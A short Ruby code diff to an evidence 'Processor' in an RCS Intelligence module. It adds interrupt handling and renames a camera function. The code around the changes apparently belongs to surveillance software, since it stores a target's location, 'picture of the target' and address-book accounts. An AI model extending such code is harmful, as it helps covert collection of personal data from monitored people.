@@ -44,6 +44,9 @@ class Processor
         sleep 1
       end
     end
+  rescue Interrupt
+    trace :info, "System shutdown. Bye bye!"
+    return 0
   rescue Exception => e
     trace :error, "Thread error: #{e.message}"
     trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
@@ -78,7 +81,7 @@ class Processor
         Position.save_last_position(entity, evidence)
       when 'camera'
         # save picture of the target
-        Camera.save_first_camera(entity, evidence)
+        Camera.save_picture(entity, evidence)
       when 'addressbook'
         # analyze the accounts
         Accounts.add_handle(entity, evidence)
@@ -187,5 +190,5 @@ class Processor
   end
 end
 
-end #OCR::
+end #Intelligence::
 end #RCS::
